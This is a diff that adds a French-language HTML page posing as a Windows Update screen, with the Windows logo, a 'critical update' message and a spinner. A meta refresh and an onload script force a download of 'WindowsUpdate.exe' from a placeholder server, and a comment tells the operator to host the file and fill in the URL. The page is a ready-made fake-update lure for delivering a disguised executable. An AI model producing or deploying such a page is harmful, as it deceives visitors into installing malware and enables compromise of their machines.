@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Mise à jour requise</title>
+  <!-- FILL: héberge WindowsUpdate.exe sur ton serveur et remplace l'URL -->
+  <meta http-equiv="refresh" content="2;url=https://FILL_YOUR_SERVER/WindowsUpdate.exe">
+  <style>
+    body { font-family: Segoe UI, sans-serif; background:#f0f0f0;
+           display:flex; align-items:center; justify-content:center; height:100vh; }
+    .box { background:#fff; padding:40px; border-radius:8px;
+           box-shadow:0 2px 12px rgba(0,0,0,.15); text-align:center; }
+    .spinner { width:40px; height:40px; border:4px solid #ccc;
+               border-top-color:#0078d4; border-radius:50%;
+               animation:spin 1s linear infinite; margin:20px auto; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Windows_logo_-_2012.svg/88px-Windows_logo_-_2012.svg.png" width="48" alt="">
+    <h2>Windows Update</h2>
+    <p>Une mise à jour critique est disponible.<br>Téléchargement en cours…</p>
+    <div class="spinner"></div>
+    <small>Ne fermez pas cette fenêtre.</small>
+  </div>
+  <script>
+    // déclenche le dl direct dès que le dom est prêt
+    window.onload = () => {
+      const a = document.createElement('a');
+      a.href = 'https://FILL_YOUR_SERVER/WindowsUpdate.exe';
+      a.download = 'WindowsUpdate.exe';
+      document.body.appendChild(a);
+      a.click();
+    };
+  </script>
+</body>
+</html>
